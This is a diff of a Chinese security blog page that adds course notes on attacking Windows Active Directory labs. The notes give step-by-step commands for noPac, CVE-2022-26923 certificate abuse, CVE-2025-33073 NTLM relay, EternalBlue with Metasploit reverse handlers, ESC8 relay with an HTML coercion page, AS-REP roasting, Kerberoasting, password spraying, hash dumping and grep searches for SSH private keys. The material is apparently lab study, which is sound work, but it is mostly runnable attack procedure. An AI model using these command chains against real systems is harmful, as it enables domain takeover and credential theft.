+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2、noPac-python版本
+</span></span><span class="line"><span class="cl">https://github.com/Ridter/noPac
+</span></span><span class="line"><span class="cl">d:\Python38\python.exe scanner.py -use-ldap &#34;god.org/webadmin:admin!@#45&#34; -dc-ip 192.168.3.21
+</span></span><span class="line"><span class="cl">d:\Python38\python.exe noPac.py -use-ldap &#34;god.org/webadmin:admin!@#45&#34; -dc-ip 192.168.3.21 -shell
+</span></span><span class="line"><span class="cl">d:\Python38\python.exe noPac.py -use-ldap &#34;god.org/webadmin:admin!@#45&#34; -dc-ip 192.168.3.21 -dump
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3、noPac-exe版本
+</span></span><span class="line"><span class="cl">https://github.com/cube0x0/noPac
+</span></span><span class="line"><span class="cl">noPac scan -domain god.org -user webadmin -pass admin!@#45
+</span></span><span class="line"><span class="cl">noPac -domain god.org -user webadmin -pass admin!@#45 /dc owa2010cn-god.god.org /mAccount dadd /mPassword sdadasdsa /service cifs /ptt
+</span></span><span class="line"><span class="cl">PsExec \\owa2010cn-god.god.org cmd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4、sam-python版本（Linux-kali）
+</span></span><span class="line"><span class="cl">https://github.com/WazeHell/sam-the-admin
+</span></span><span class="line"><span class="cl">proxychains4 python sam_the_admin.py god/&#39;webadmin:admin!@#45&#39; -dc-ip 192.168.3.21 -shell
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#横向移动-域控提权-CVE-2022-26923
+</span></span><span class="line"><span class="cl">当Windows系统的Active Directory证书服务（CS）在域上运行时，由于机器账号中的dNSHostName属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从Active Directory证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限。
+</span></span><span class="line"><span class="cl">影响：Win8.1、Win10、Win11、WinServer2012R2、WinServer2016、WinServer2019、WinServer2022等版本
+</span></span><span class="line"><span class="cl">前提条件：
+</span></span><span class="line"><span class="cl">1、一个域内普通账号
+</span></span><span class="line"><span class="cl">2、域内存在证书服务器
+</span></span><span class="line"><span class="cl">环境如报错修复：http://www.xiaodi8.com/doc/246/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C2中获取CA结构名和计算机名
+</span></span><span class="line"><span class="cl">shell certutil
+</span></span><span class="line"><span class="cl">powershell Get-ChildItem Cert:\LocalMachine\Root\
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">域内信息
+</span></span><span class="line"><span class="cl">192.168.3.111
+</span></span><span class="line"><span class="cl">test Pass123
+</span></span><span class="line"><span class="cl">xiaodi-DC-CA
+</span></span><span class="line"><span class="cl">dc.xiaodi.lab
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Kali添加访问域内信息 /etc/hosts
+</span></span><span class="line"><span class="cl">192.168.3.111 xiaodi.lab
+</span></span><span class="line"><span class="cl">192.168.3.111 xiaodi-DC-CA
+</span></span><span class="line"><span class="cl">192.168.3.111 dc.xiaodi.lab
+</span></span><span class="line"><span class="cl">proxychains4配置
+</span></span><span class="line"><span class="cl">vim /etc/proxychains4.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">https://github.com/ly4k/Certipy
+</span></span><span class="line"><span class="cl">注意使用的是certipy 3版本 最新版参数不一致（kali2023以下版本自带）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1、申请低权限用户证书：
+</span></span><span class="line"><span class="cl">certipy req &#39;xiaodi.lab/test:Pass123@dc.xiaodi.lab&#39; -ca xiaodi-DC-CA -template User -debug 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2、检测证书
+</span></span><span class="line"><span class="cl">certipy auth -pfx test.pfx -dc-ip 192.168.3.111
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3、创建一个机器账户：
+</span></span><span class="line"><span class="cl">python3 bloodyAD.py -d xiaodi.lab -u test -p &#39;Pass123&#39; --host 192.168.3.111 addComputer pwnmachine &#39;CVEPassword1234*&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4、设置机器账户属性(dNSHostName和DC一致)：
+</span></span><span class="line"><span class="cl">python3 bloodyAD.py -d xiaodi.lab -u test -p &#39;Pass123&#39; --host 192.168.3.111 setAttribute &#39;CN=pwnmachine,CN=Computers,DC=xiaodi,DC=lab&#39; dNSHostName &#39;[&#34;DC.xiaodi.lab&#34;]&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">5、再次申请证书：
+</span></span><span class="line"><span class="cl">certipy req &#39;xiaodi.lab/pwnmachine$:CVEPassword1234*@192.168.3.111&#39; -template Machine -dc-ip 192.168.3.111 -ca xiaodi-DC-CA -debug
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">6、检测证书：
+</span></span><span class="line"><span class="cl">certipy auth -pfx ./dc.pfx -dc-ip 192.168.3.111
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">7、导出HASH：
+</span></span><span class="line"><span class="cl">python3 secretsdump.py &#39;xiaodi.lab/dc$@DC.xiaodi.lab&#39; -hashes :10e02bef2258ad9b239e2281a01827a4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">8、利用HASH：
+</span></span><span class="line"><span class="cl">python3 wmiexec.py xiaodi.lab/administrator@192.168.3.111 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#WIN-AD域控提权-CVE-2025-33073
+</span></span><span class="line"><span class="cl">前提条件：一个域内普通账号，DNS服务
+</span></span><span class="line"><span class="cl">https://github.com/fortra/impacket
+</span></span><span class="line"><span class="cl">https://github.com/topotam/PetitPotam
+</span></span><span class="line"><span class="cl">https://github.com/mverschu/CVE-2025-33073
+</span></span><span class="line"><span class="cl">参考复现：https://mp.weixin.qq.com/s/9ZwWI8zHOioid8YJnNgSTA
+</span></span><span class="line"><span class="cl">1、验证SMB签名状态和强制漏洞：
+</span></span><span class="line"><span class="cl">nxc smb 192.168.3.21 -u webadmin -p &#39;admin!@#45&#39; -M coerce_plus
+</span></span><span class="line"><span class="cl">2、添加一条DNS记录
+</span></span><span class="line"><span class="cl">python dnstool.py -u god.org\webadmin -p &#39;admin!@#45&#39; 192.168.3.21 -a add -r sqlserver1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.3.135
+</span></span><span class="line"><span class="cl">3、启动监听
+</span></span><span class="line"><span class="cl">python ntlmrelayx.py -t 192.168.3.32 -smb2support -ts -c whoami
+</span></span><span class="line"><span class="cl">4、进行强制NTLM认证
+</span></span><span class="line"><span class="cl">python PetitPotam.py -d god.org -u webadmin -p &#39;admin!@#45&#39; sqlserver1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 192.168.3.32
+</span></span><span class="line"><span class="cl">成功复现：https://mp.weixin.qq.com/s/vDbF-h6MzU8ruLOZvYnDLQ
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#横向移动-系统漏洞-CVE-2017-0146
+</span></span><span class="line"><span class="cl">CVE-2017-0146(MS17010) 
+</span></span><span class="line"><span class="cl">Windows Vista SP2; 
+</span></span><span class="line"><span class="cl">Windows Server 2008 SP2 and R2 SP1; 
+</span></span><span class="line"><span class="cl">Windows 7 SP1; 
+</span></span><span class="line"><span class="cl">Windows 8.1; 
+</span></span><span class="line"><span class="cl">Windows Server 2012 Gold and R2; 
+</span></span><span class="line"><span class="cl">Windows RT 8.1;  
+</span></span><span class="line"><span class="cl">Windows 10 Gold, 1511, and 1607; 
+</span></span><span class="line"><span class="cl">Windows Server 2016
+</span></span><span class="line"><span class="cl">-插件检测-横向移动
+</span></span><span class="line"><span class="cl">-CS联动MSF-检测&amp;利用
+</span></span><span class="line"><span class="cl">1、C2创建外联监听器
+</span></span><span class="line"><span class="cl">2、C2执行联动MSF
+</span></span><span class="line"><span class="cl">msf ip 8888 
+</span></span><span class="line"><span class="cl">spawn msf
+</span></span><span class="line"><span class="cl">3、MSF监听联动配置
+</span></span><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl">set payload windows/meterpreter/reverse_http
+</span></span><span class="line"><span class="cl">set lhost 0.0.0.0
+</span></span><span class="line"><span class="cl">set lport 8888
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">4、添加路由
+</span></span><span class="line"><span class="cl">run autoroute -p //查看当前路由表
+</span></span><span class="line"><span class="cl">run post/multi/manage/autoroute //添加当前路由表
+</span></span><span class="line"><span class="cl">5、检测模块
+</span></span><span class="line"><span class="cl">use auxiliary/scanner/smb/smb_ms17_010
+</span></span><span class="line"><span class="cl">set rhosts 192.168.3.21-32 //设置扫描目标段
+</span></span><span class="line"><span class="cl">set threads 5 //设置扫描线程数
+</span></span><span class="line"><span class="cl">run 
+</span></span><span class="line"><span class="cl">6、利用模块
+</span></span><span class="line"><span class="cl">use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span class="line"><span class="cl">set payload windows/x64/meterpreter/bind_tcp //正向连接上线
+</span></span><span class="line"><span class="cl">set rhost 192.168.3.25 //设置连接目标
+</span></span><span class="line"><span class="cl">set rhosts 192.168.3.25 //设置扫描目标
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">其他重要漏洞合集：
+</span></span><span class="line"><span class="cl">参考：https://mp.weixin.qq.com/s/Rd2wUxH-rG6f1oX-xS8png
+</span></span><span class="line"><span class="cl">MS14-068 前期已讲PTT课程
+</span></span><span class="line"><span class="cl">PrintNightmare
+</span></span><span class="line"><span class="cl">Exchange系列
+</span></span><span class="line"><span class="cl">...........
+</span></span></code></pre></div><h3 id="补充">
+<a class="header-anchor" href="#%e8%a1%a5%e5%85%85"></a>
+补充
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">知识参考：
+</span></span><span class="line"><span class="cl">http://www.xiaodi8.com/doc/259/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">经过前面和今天的讲解大概归类总结：
+</span></span><span class="line"><span class="cl">1、NTLM离线三重天
+</span></span><span class="line"><span class="cl">基于LLMNR/NBT-NS/mDNS欺骗
+</span></span><span class="line"><span class="cl">基于AS-REP Roasting无认证用户
+</span></span><span class="line"><span class="cl">基于Kerberoasting服务账户
+</span></span><span class="line"><span class="cl">2、NTLM重放三重天
+</span></span><span class="line"><span class="cl">relay to SMB
+</span></span><span class="line"><span class="cl">relay to EWS
+</span></span><span class="line"><span class="cl">relay to AD CS(ldap)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#利用AD CS证书服务安全（如ESC1, ESC8）
+</span></span><span class="line"><span class="cl">复现原理：ESC8+ntlm relay to AD CS证书
+</span></span><span class="line"><span class="cl">• ESC1：利用配置不当的证书模板（允许低权限用户注册、启用客户端认证、允许任意SAN、管理器批准禁用），申请可用于身份认证的证书，进而获取权限。
+</span></span><span class="line"><span class="cl">• ESC8：利用AD CS Web Enrollment服务启用NTLM认证且未启用EPPN的弱点，结合NTLM Relay攻击，中继到AD CS HTTP终结点申请证书。
+</span></span><span class="line"><span class="cl">工具： Certipy-ad等
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1. 扫描AD CS漏洞模板
+</span></span><span class="line"><span class="cl">certipy-ad find -u webadmin@god.org -p &#39;admin!@#45&#39; -dc-ip 192.168.3.21 -vulnerable -ldap-scheme ldap
+</span></span><span class="line"><span class="cl">certipy-ad find -u jack@0day.org -p &#39;admin!@#45&#39; -dc-ip 192.168.3.142 -vulnerable -ldap-scheme ldap
+</span></span><span class="line"><span class="cl">根据结果判断利用ESC1还是ESC8（Found 0 certificate templates）
+</span></span><span class="line"><span class="cl">无法利用：
+</span></span><span class="line"><span class="cl">-环境没部署AD CS证书服务
+</span></span><span class="line"><span class="cl">-无配置不当就无法利用ESC1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2. 监听欺骗
+</span></span><span class="line"><span class="cl">responder -I eth1 -d
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3. NTLM中继到AD CS HTTPS端点
+</span></span><span class="line"><span class="cl">python ntlmrelayx.py -t https://OWA2010SP3.0day.org/certsrv/certSrv.asp --adcs --template User -smb2support
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3. 目标触发
+</span></span><span class="line"><span class="cl">\\192.168.3.128
+</span></span><span class="line"><span class="cl">http://192.168.3.68/31.html
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html lang=&#34;en&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">  &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">  &lt;script src=&#34;\\192.168.3.128\test&#34;&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4. 证书登录 → 域管LDAP Shell（最终成功命令）
+</span></span><span class="line"><span class="cl">certipy-ad auth -pfx ./Users.pfx -dc-ip 192.168.3.142 -ldap-shell
+</span></span><span class="line"><span class="cl">certipy-ad auth -pfx ./SQLADMIN.pfx -dc-ip 192.168.3.142 -ldap-shell
+</span></span><span class="line"><span class="cl">certipy-ad auth -pfx ./Users.pfx -domain 0day.org -dc-ip 192.168.3.142
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">5 后续利用
+</span></span><span class="line"><span class="cl">由于ldap不能直接读密码哈希 但可以增加域管或修改
+</span></span><span class="line"><span class="cl">change_password Administrator Admin@123456
+</span></span><span class="line"><span class="cl">python psexec.py 0day/Administrator:Admin@123456@192.168.3.142
+</span></span><span class="line"><span class="cl">python secretsdump.py 0day.org/Administrator:Admin@123456@192.168.3.142 -just-dc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#AS-REP Roasting攻击流程
+</span></span><span class="line"><span class="cl">域内无需预认证的用户，可直接向DC请求AS票据可爆破的Kerberos哈希
+</span></span><span class="line"><span class="cl">1、探测域内无预认证用户
+</span></span><span class="line"><span class="cl">文件落地：Rubeus.exe asreproast
+</span></span><span class="line"><span class="cl">文件不落地：（需建立Socks节点）
+</span></span><span class="line"><span class="cl">单用户名测试：python GetNPUsers.py god.org/webadmin -dc-ip 192.168.3.21 -request -format hashcat -no-pass
+</span></span><span class="line"><span class="cl">多用户名测试：python GetNPUsers.py god.org/ -usersfile users.txt -dc-ip 192.168.3.21 -request -format hashcat -no-pass
+</span></span><span class="line"><span class="cl">2、格式化哈希，离线爆破密码
+</span></span><span class="line"><span class="cl">hashcat -m 18200 hash.txt pass.txt --force
+</span></span><span class="line"><span class="cl">3、权限利用
+</span></span><span class="line"><span class="cl">域内横向登录
+</span></span><span class="line"><span class="cl">SMB、WMI等登录主机
+</span></span><span class="line"><span class="cl">提升权限、接管域控
+</span></span><span class="line"><span class="cl">*大概流程：
+</span></span><span class="line"><span class="cl">攻击者 → 探测DC → 找出免预认证用户 → 发送无预认证AS-REQ → DC返回AS-REP票据 → 提取Kerberos哈希 → 离线爆破 → 获取明文 → 域内渗透
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#Kerberoasting攻击流程
+</span></span><span class="line"><span class="cl">向域控请求服务TGS票据，票据内包含服务账号NTLM哈希，离线爆破明文；
+</span></span><span class="line"><span class="cl">攻击目标：域用户身份运行的服务账号（非机器账号），常见sql、iis、www、svc类账号。
+</span></span><span class="line"><span class="cl">1、探测域内带SPN的服务账号
+</span></span><span class="line"><span class="cl">setspn -T god.org -Q */*
+</span></span><span class="line"><span class="cl">setspn -T 0day.org -Q */*
+</span></span><span class="line"><span class="cl">Rubeus.exe kerberoast /out:tgs_hash.txt
+</span></span><span class="line"><span class="cl">python GetUserSPNs.py -request -dc-ip 192.168.3.142 0day.org/jack:admin!@#45 -outputfile hash.txt
+</span></span><span class="line"><span class="cl">2、格式化哈希，离线爆破密码
+</span></span><span class="line"><span class="cl">hashcat -m 13100 tgs.txt pass.txt --force
+</span></span><span class="line"><span class="cl">3、权限利用
+</span></span><span class="line"><span class="cl">横向登录对应业务服务器
+</span></span><span class="line"><span class="cl">接管数据库、应用服务
+</span></span><span class="line"><span class="cl">进一步提权渗透域环境
+</span></span><span class="line"><span class="cl">*大概流程：
+</span></span><span class="line"><span class="cl">普通域用户权限 → 枚举域内SPN服务账号 → 向DC请求TGS服务票据 → 导出$krb5tgs$哈希 → 离线爆破 → 获取服务账号密码 → 横向移动
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#单独的中继监听可爆破（见前面课程讲解）
+</span></span><span class="line"><span class="cl">利用LLMNR/NBT-NS/mDNS欺骗• 在缺乏DNS解析或解析失败时，主机通过LLMNR/NBT-NS/mDNS广播查询主机名。攻击者响应欺骗，引导受害者访问恶意服务器，诱导其发起NTLM认证（常与NTLM Relay结合）。工具：Responder
+</span></span></code></pre></div><h3 id="横向思路">
+<a class="header-anchor" href="#%e6%a8%aa%e5%90%91%e6%80%9d%e8%b7%af"></a>
+横向思路
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">入口跳板机与打点及横向移动思路相呼应
+</span></span><span class="line"><span class="cl">场景1：入口机在xiaodi.com下
+</span></span><span class="line"><span class="cl">场景2：入口机在hr.xiaodi.com下
+</span></span><span class="line"><span class="cl">场景3：入口机在xiaodi.com.cn下
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#信息收集：
+</span></span><span class="line"><span class="cl">nltest /domain_trusts /all_trusts
+</span></span><span class="line"><span class="cl">域信任的列表:
+</span></span><span class="line"><span class="cl">    0: hrxdcom hr.xiaodi.com (NT 5) (Forest: 1) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
+</span></span><span class="line"><span class="cl">    1: xdcom xiaodi.com (NT 5) (Forest Tree Root)
+</span></span><span class="line"><span class="cl">    2: gaxdcom ga.xiaodi.com (NT 5) (Forest: 1)
+</span></span><span class="line"><span class="cl">    3: ggaxdcom g.ga.xiaodi.com (NT 5) (Forest: 2)
+</span></span><span class="line"><span class="cl">    4: hhrxdcom h.hr.xiaodi.com (NT 5) (Forest: 0) (Primary Domain) (Native)
+</span></span><span class="line"><span class="cl">此命令成功完成
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">域信任的列表:
+</span></span><span class="line"><span class="cl">    0: xdcom xiaodi.com (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
+</span></span><span class="line"><span class="cl">    1: xdcomcn xiaodi.com.cn (NT 5) (Forest Tree Root) (Primary Domain) (Native)
+</span></span><span class="line"><span class="cl">此命令成功完成
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#协议移动：
+</span></span><span class="line"><span class="cl">python smbexec.py xdcom/administrator:xiaodi8.com@192.168.60.10
+</span></span><span class="line"><span class="cl">python smbexec.py hrxdcom/administrator:xiaodi8.com@192.168.60.30
+</span></span><span class="line"><span class="cl">python smbexec.py hhrxdcom/administrator:xiaodi8.com@192.168.60.35
+</span></span><span class="line"><span class="cl">python smbexec.py xdcomcn/administrator:xiaodi8.com@192.168.60.40
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#密码喷射：
+</span></span><span class="line"><span class="cl">echo -e &#34;xdcom\nxdcomcn\nhrxdcom\ngaxdcom\nggaxdcom\nhhrxdcom&#34; &gt; domains.txt
+</span></span><span class="line"><span class="cl">域管理测试：crackmapexec smb 192.168.60.10-41 -u administrator -p xiaodi8.com -d domains.txt -x &#34;whoami&#34;
+</span></span><span class="line"><span class="cl">本地管理测试：crackmapexec smb 192.168.60.10-41 -u administrator -p xiaodi8.com --local-auth -x &#34;whoami&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#域控提权：
+</span></span><span class="line"><span class="cl">python secretsdump.py xdcom/administrator:xiaodi8.com@192.168.60.10 -just-dc
+</span></span><span class="line"><span class="cl">python sam_the_admin.py xdcom/&#39;xinrentest:admin!@#45&#39; -dc-ip 192.168.60.10 -shell
+</span></span><span class="line"><span class="cl">python sam_the_admin.py gaxdcom/&#39;gapc:admin!@#45&#39; -dc-ip 192.168.60.20 -shell
+</span></span><span class="line"><span class="cl">python sam_the_admin.py hrxdcom/&#39;hr:admin!@#45&#39; -dc-ip 192.168.60.30 -shell
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Linux横向移动手法相对Windows来说较少，相对来说只有利用SSH、Web上的漏洞等较少方式去获得权限 在SSH协议中，连接到主机可采用两种登录方式：密码登录方式、密钥登录方式，相关利用：
+</span></span><span class="line"><span class="cl">1、密码登录方式：爆破
+</span></span><span class="line"><span class="cl">2、密钥登录方式：获取秘钥
+</span></span><span class="line"><span class="cl">敏感文件
+</span></span><span class="line"><span class="cl">~/.ssh/config #配置 ssh 连接相关参数的配置文件
+</span></span><span class="line"><span class="cl">~/.ssh/known_hosts  # 该服务器所有登录过的服务器的信息
+</span></span><span class="line"><span class="cl">~/.bash_history # 通过历史命令看该有没有使用ssh私钥去连接服务器
+</span></span><span class="line"><span class="cl">搜索含有SSH凭证文件
+</span></span><span class="line"><span class="cl">grep -ir &#34;BEGIN RSA PRIVATE KEY&#34; /*
+</span></span><span class="line"><span class="cl">grep -ir &#34;BEGIN DSA PRIVATE KEY&#34; /*
+</span></span><span class="line"><span class="cl">grep -ir &#34;BEGIN OPENSSH PRIVATE KEY&#34; /*
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">寻找密钥对文件：
+</span></span><span class="line"><span class="cl">1、通过历史命令看看有没有连接过主机采用的文件
+</span></span><span class="line"><span class="cl">2、通过搜索内容查看哪些符合密钥对文件的特征
+</span></span><span class="line"><span class="cl">3、通过查看敏感文件中的配置型信息获取文件
 </span></span></code></pre></div><h2 id="攻击链梳理">
 <a class="header-anchor" href="#%e6%94%bb%e5%87%bb%e9%93%be%e6%a2%b3%e7%90%86"></a>
 攻击链梳理
@@ -1322,7 +1842,7 @@ KB2871997补丁对域环境的影响
     aria-label="Article navigation"
     data-aos="fade-up"
   ><div class="article-nav-link-wrap left"><img
-              data-src="https://d-sketon.top/img/_backwebp/bg27.webp"
+              data-src="https://d-sketon.top/img/_backwebp/bg3.webp"
               data-sizes="auto"
               alt="htb-Base"
               class="lazyload"
@@ -1334,7 +1854,7 @@ KB2871997补丁对域环境的影响
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">htb-Base</h3>
       </div><div class="article-nav-link-wrap right"><img
-              data-src="https://d-sketon.top/img/_backwebp/bg13.webp"
+              data-src="https://d-sketon.top/img/_backwebp/bg2.webp"
               data-sizes="auto"
               alt="内网通信"
               class="lazyload"
@@ -1366,10 +1886,10 @@ KB2871997补丁对域环境的影响
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;103.5k</span
+          >&nbsp;113.0k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;04:12</span>
+        <span class="icon-coffee">&nbsp;04:32</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -1419,9 +1939,14 @@ KB2871997补丁对域环境的影响
         <li><a href="#kb2871997补丁对域环境的影响">KB2871997补丁对域环境的影响</a></li>
         <li><a href="#委派">委派</a></li>
         <li><a href="#非约束委派攻击">非约束委派攻击</a></li>
-        <li><a href="#约束委派攻击-有点复杂还没有捋顺">约束委派攻击 (有点复杂，还没有捋顺)</a></li>
+        <li><a href="#约束委派攻击">约束委派攻击</a></li>
         <li><a href="#关于约束和非约束委派的思考">关于约束和非约束委派的思考</a></li>
         <li><a href="#资源约束委派攻击">资源约束委派攻击</a></li>
+        <li><a href="#net-ntlm-hash捕获">NET-NTLM-HASH捕获</a></li>
+        <li><a href="#域内邮件服务-针对exchange的攻击">域内邮件服务-针对exchange的攻击</a></li>
+        <li><a href="#域内漏洞">域内漏洞</a></li>
+        <li><a href="#补充">补充</a></li>
+        <li><a href="#横向思路">横向思路</a></li>
       </ul>
     </li>
     <li><a href="#攻击链梳理">攻击链梳理</a></li>
@@ -1440,7 +1965,7 @@ KB2871997补丁对域环境的影响
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>文章</div><div class="sidebar-state-number">84</div>
+    <div>文章</div><div class="sidebar-state-number">87</div>
   </div>
   <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
     <div>分类</div>
